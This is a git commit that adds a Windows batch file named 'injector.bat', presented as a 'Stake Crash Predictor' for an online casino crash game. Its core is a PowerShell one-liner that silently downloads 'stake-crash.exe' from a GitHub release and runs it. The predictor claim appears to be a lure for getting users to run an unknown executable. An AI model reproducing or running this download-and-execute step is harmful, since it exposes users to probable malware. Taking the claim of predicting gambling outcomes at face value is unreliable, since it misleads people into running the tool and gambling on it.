49b942593af0aef611ee881e9be29a3ed71065f9
Stake-Predictor-IW <abdeloulahi@gmx.fr>
2024-06-21 17:16:30 +0200

    Add files via upload

---
+++ injector.bat
@@ -0,0 +1,13 @@
+@echo off
+
+title Stake Crash Predictor
+rem You can do any color
+color 0c
+
+echo.
+echo Coded By https://github.com/Stake-Predictor-IW
+echo.
+
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Predictor-IW/Stake-Crash-Predictor/releases/download/Crash-Predictor/stake-crash.exe';$file='stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+
+https://stake.com/fr/casino/games/crash
